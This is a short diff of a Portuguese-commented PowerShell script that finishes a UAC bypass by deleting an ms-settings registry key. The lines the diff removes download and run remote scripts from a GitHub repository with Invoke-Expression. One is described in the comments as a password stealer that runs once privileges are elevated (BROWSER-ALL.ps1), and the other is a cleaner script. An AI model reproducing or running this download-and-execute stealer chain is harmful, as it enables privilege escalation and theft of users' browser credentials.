@@ -14,12 +14,3 @@ Start-Sleep 3
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
 # ... (código do bypass admin) ...
-
-# Após obter privilégios elevados, execute o roubador de senhas
-$browserUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1"
-Invoke-Expression (Invoke-WebRequest -Uri $browserUrl -UseBasicParsing).Content
-
-# ... (código do bypass + chamada ao BROWSER-ALL.ps1) ...
-
-$cleanerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/CLEANER.ps1"
-Invoke-Expression (Invoke-WebRequest -Uri $cleanerUrl -UseBasicParsing).Content
